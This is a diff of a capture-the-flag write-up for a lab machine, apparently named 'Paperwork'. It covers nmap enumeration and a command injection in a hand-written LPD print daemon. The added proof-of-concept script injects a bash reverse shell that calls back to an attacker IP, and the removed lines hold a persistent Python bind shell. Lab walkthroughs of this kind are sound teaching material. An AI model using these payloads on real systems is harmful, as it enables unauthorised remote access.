@@ -27,17 +27,37 @@ Paperwork leans hard into its theme. Every service on the box is some flavor of 
 
 A port scan turns up a small, slightly unusual surface for a corporate "archiving" box:
 
+```
+$ nmap -p- -T4 10.129.248.117 --min-rate=5000
+...
+Nmap scan report for paperwork.htb (10.129.248.117)
+Host is up (0.17s latency).
+Not shown: 65483 closed tcp ports (reset), 49 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+1515/tcp open  ifor-protocol
+```
+{:filename="nmap-p-.txt"}
+
 ![nmap scan](/assets/img/img_Paperwork/paperwork-nmap-scan.png)
+
+```
+$ nmap -p22,80,1515 -sCV -T4 --min-rate=5000 10.129.248.117
+...
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    nginx 1.28.0 (Ubuntu)
+|_http-title: Intranet | Document Archiving Service
+1515/tcp open  ifor-protocol?
+| fingerprint-strings:
+|_    Archive_Printer is ready and printing.
+```
+{:filename="nmap-sCV.txt"}
 
 ![nmap service scan](/assets/img/img_Paperwork/paperwork-nmap-service-scan.png)
 
-| Port | Service | Notes |
-|---|---|---|
-| 22 | ssh | OpenSSH |
-| 80 | http (nginx) | vhost `paperwork.htb`, reverse-proxies to a local Flask app |
-| 1515 | LPD (RFC 1179) | custom Python implementation |
-
-Port `1515` is the interesting one. LPD (Line Printer Daemon) is a genuinely ancient protocol — RFC 1179 dates to 1990 — and finding a *hand-written* implementation of it rather than a stock package strongly suggests the box wants its source code read, not just fuzzed blind.
+nmap can't identify port 1515 at all (`ifor-protocol?`, a guess) — but its fingerprint probe already snagged the banner *"Archive_Printer is ready and printing."*, which turns out to be the literal string the daemon sends back for LPD commands `03`/`04`, straight out of its own source. It's the interesting port either way. LPD (Line Printer Daemon) is a genuinely ancient protocol — RFC 1179 dates to 1990 — and finding a *hand-written* implementation of it rather than a stock package strongly suggests the box wants its source code read, not just fuzzed blind.
 
 ## 80 - Web Server
 
@@ -107,59 +127,56 @@ To reach `handle_print_job` we only need to speak the bare minimum of the LPD ha
 
 The payload just needs to close and reopen the single quotes cleanly:
 ```
-x'; <our command> & echo '
+x'; <our command>; echo '
 ```
-`x` fills the harmless first half of the original `echo`, `;` ends that statement, our injected command runs, `&` backgrounds it so the daemon doesn't hang waiting for it, and `echo '` reopens a quote so the tail of the original string (`' >> /tmp/archive.log`) still parses fine.
+`x` fills the harmless first half of the original `echo`, `;` ends that statement, our injected command runs, and `echo '` reopens a quote so the tail of the original string (`' >> /tmp/archive.log`) still parses fine.
+
+For the injected command, a plain classic reverse shell over `/dev/tcp`:
 
 ```python
-# poc.py
 import socket
 
-TARGET, PORT = "10.129.X.X", 1515
-payload = "x'; <injected command> & echo '"
+TARGET = "10.129.248.117"
+PORT = 1515
+LHOST = "10.10.17.34"
+LPORT = 44412
+
+payload = f"x'; bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'; echo '"
 cfile = f"J{payload}\nHhost\nPuser\n".encode()
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((TARGET, PORT))
 s.send(b'\x02archive_intake\n')
-s.recv(1024)
+print(s.recv(1024))  # expect \x00
+
 s.send(b'\x02' + f"{len(cfile)} cfA001host\n".encode())
-s.recv(1024)
+print(s.recv(1024))  # ack
 s.send(cfile)
-s.recv(4096)
+print(s.recv(4096))
+s.close()
 ```
 {:filename="poc.py"}
 
+With a listener up first (`penelope -i tun0 -p 44412`), running it:
+
 ![Running the LPD command injection PoC](/assets/img/img_Paperwork/paperwork-poc.png)
 
-For the injected command itself, rather than a plain one-shot reverse shell, we drop a small persistent **bind shell** — a base64-encoded Python one-liner that forks off a fresh `bash -i` for every connection it receives. It saves having to re-trigger the injection every time we want to run one more command:
-
-```python
-import socket, subprocess, os
-s = socket.socket()
-s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.bind(('0.0.0.0', 5555))
-s.listen(5)
-while True:
-    c, a = s.accept()
-    if os.fork() == 0:
-        os.dup2(c.fileno(), 0); os.dup2(c.fileno(), 1); os.dup2(c.fileno(), 2)
-        subprocess.call(['/bin/bash', '-i'])
-        os._exit(0)
-    c.close()
-```
-{:filename="listener.py"}
+Three acks back (`b'\x00'` × 3 — queue accepted, control-file header accepted, job executed), and the shell lands:
 
 ![First shell as lp](/assets/img/img_Paperwork/paperwork-foothold.png)
 
 ```
-$ id
-uid=7(lp) gid=7(lp) groups=7(lp)
-$ hostname
-paperwork
-```
+[+] [New Reverse Shell] => paperwork 10.129.248.117 Linux-x86_64 lp(7)
+[+] Upgrading shell to PTY... successful via /usr/bin/python3
 
-**Foothold as `lp` achieved.**
+lp@paperwork:/opt/LPDServer$ ls
+server.py
+lp@paperwork:/opt/LPDServer$ uname -a
+Linux paperwork 6.17.0-40-generic #40-Ubuntu SMP PREEMPT_DYNAMIC Fri Jun 19 16:42:13 UTC 2026 x86_64 GNU/Linux
+```
+{:filename="foothold.txt"}
+
+**Foothold as `lp` achieved.** (For later steps we also scripted a small persistent bind-shell to run one-shot commands without re-triggering the injection every time — not part of the core chain, just automation plumbing.)
 
 ## Enumeration as `lp`
 
